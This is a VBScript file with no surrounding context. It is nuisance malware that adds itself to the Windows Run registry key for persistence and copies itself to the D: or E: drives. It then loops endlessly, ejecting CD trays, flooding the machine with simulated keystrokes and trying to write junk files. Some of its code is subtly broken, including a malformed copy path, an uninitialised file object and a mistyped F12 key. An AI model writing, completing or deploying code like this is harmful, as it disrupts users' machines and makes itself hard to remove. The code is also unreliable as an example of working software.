On Error Resume Next
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
set shell=WScript.CreateObject("Wscript.shell")
Set drivep=Wscript.CreateObject("Wscript.Network")
ll=Wscript.ScriptFullName
ll2=Wscript.ScriptName
'Boom sector a
'sector a can be changed......
shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\",ll,"REG_SZ"
if not fso.fileexists("D:\"&ll2) then
if fso.driveexists("D:\") then
fso.Copyfile ll,"D:\" & ll
shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\","D:\"&ll2,"REG_SZ"
end if	
elseif not fso.fileexists("E:\"&ll2) then
if fso.driveexists("E:\") then
fso.CopyFile ll,"E:\" & ll
shell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\","E:\"&ll2,"REG_SZ"
end if 
end if 
Dim g(12)
g(1)="{F1}"
g(2)="{F2}"
g(3)="{F3}"
g(4)="{F4}"
g(5)="{F5}"
g(6)="{F6}"
g(7)="{F7}"
g(8)="{F8}"
g(9)="{F9}"
g(10)="{F10}"
g(11)="{F11}"
g(12)="{F12]"
dim b(36)
b(1)="{Q}"
b(2)="{W}"
b(3)="{E}"
b(4)="{R}"
b(5)="{T}"
b(6)="{Y}"
b(7)="{U}"
b(8)="{I}"
b(9)="{O}"
b(10)="{P}"
b(11)="{A}"
b(12)="{S}"
b(13)="{D}"
b(14)="{F}"
b(15)="{G}"
b(16)="{H}"
b(17)="{J}"
b(18)="{K}"
b(19)="{L}"
b(20)="{Z}"
b(21)="{X}"
b(22)="{C}"
b(23)="{V}"
b(24)="{B}"
b(25)="{N}"
b(26)="{M}"
b(27)="{0}"
b(28)="{1}"
b(29)="{2}"
b(30)="{3}"
b(31)="{4}"
b(32)="{5}"
b(33)="{6}"
b(34)="{7}"
b(35)="{8}"
b(36)="{9}"
shell.popup "GOODBYE!",5,""
'START
dim gh,hj
set lpo=Wscript.CreateObject("WMPlayer.Ocx.7")
set lpo2=lpo.cdromCollection
  kala=0
  Do
  if lpo2.count >=1 then
   for kia=0 to lpo2.count -1
    lpo2.item(kia).eject
   next
  end if
  m=0
  a=0
  c=0
  shell.sendkeys "{BREAK}"
  shell.sendkeys "{BACKSPACE}"
  shell.sendkeys "{CAPSLOCK}"
  shell.sendkeys "{~}"
  shell.sendkeys "{!}"
  shell.sendkeys "{^}"
  shell.sendkeys "{CLEAR}"
  shell.sendkeys "{LEFT}"
  shell.sendkeys "{RIGHT}"
  shell.sendkeys "{UP}"
  shell.sendkeys "{DOWN}"
  shell.sendkeys "{END}"
  shell.sendkeys "{ENTER}"
  shell.sendkeys "{ESCAPE}"
  shell.sendkeys "{HELP}"
  shell.sendkeys "{HOME}"
  shell.sendkeys "{PGUP}"
  shell.sendkeys "{PGDN}"
  shell.sendkeys "{PRTSC}"
  do
   m=m+1
   shell.sendkeys g(m)
  loop until m=12
  do
   c=c+1
   shell.sendkeys b(c)
   loop until c=36
 do
  x=x+1
  x2=Cstr(x)
  set m=a.createtextfile(x2)
   m.writeline("sdaaaaaaahffggdycgghstfwwdrtttrsweryhdthfhrdfrrtystfreriudgrjdeuigthDASY")
  m.close
 loop until x=50
 input=0
loop'Main Loop Stable

